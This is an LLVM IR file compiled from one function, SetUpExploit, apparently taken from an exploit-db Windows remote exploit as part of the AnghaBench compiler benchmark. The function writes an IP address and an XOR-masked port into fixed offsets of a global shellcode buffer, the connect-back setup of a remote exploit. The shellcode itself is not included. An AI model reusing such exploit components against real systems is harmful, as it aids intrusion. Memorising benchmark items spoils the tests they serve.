; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_80.c_SetUpExploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_80.c_SetUpExploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@exploit = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @SetUpExploit(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i16, align 2
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i16 0, i16* %6, align 2
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i64 0, i64 0), i8** %7, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i64 0, i64 0), i8** %8, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = call i32 @inet_addr(i8* %9)
  store i32 %10, i32* %5, align 4
  %11 = bitcast i32* %5 to i8*
  store i8* %11, i8** %7, align 8
  %12 = load i8*, i8** %7, align 8
  %13 = getelementptr inbounds i8, i8* %12, i64 0
  %14 = load i8, i8* %13, align 1
  %15 = load i8*, i8** @exploit, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 191
  store i8 %14, i8* %16, align 1
  %17 = load i8*, i8** %7, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = load i8*, i8** @exploit, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 192
  store i8 %19, i8* %21, align 1
  %22 = load i8*, i8** %7, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 2
  %24 = load i8, i8* %23, align 1
  %25 = load i8*, i8** @exploit, align 8
  %26 = getelementptr inbounds i8, i8* %25, i64 193
  store i8 %24, i8* %26, align 1
  %27 = load i8*, i8** %7, align 8
  %28 = getelementptr inbounds i8, i8* %27, i64 3
  %29 = load i8, i8* %28, align 1
  %30 = load i8*, i8** @exploit, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 194
  store i8 %29, i8* %31, align 1
  %32 = load i32, i32* %4, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33)
  store i16 %34, i16* %6, align 2
  %35 = load i16, i16* %6, align 2
  %36 = zext i16 %35 to i32
  %37 = xor i32 %36, 65535
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %6, align 2
  %39 = bitcast i16* %6 to i8*
  store i8* %39, i8** %8, align 8
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 0
  %42 = load i8, i8* %41, align 1
  %43 = load i8*, i8** @exploit, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 209
  store i8 %42, i8* %44, align 1
  %45 = load i8*, i8** %8, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = load i8*, i8** @exploit, align 8
  %49 = getelementptr inbounds i8, i8* %48, i64 210
  store i8 %47, i8* %49, align 1
  ret i32 0
}

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local zeroext i16 @htons(i16 zeroext) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
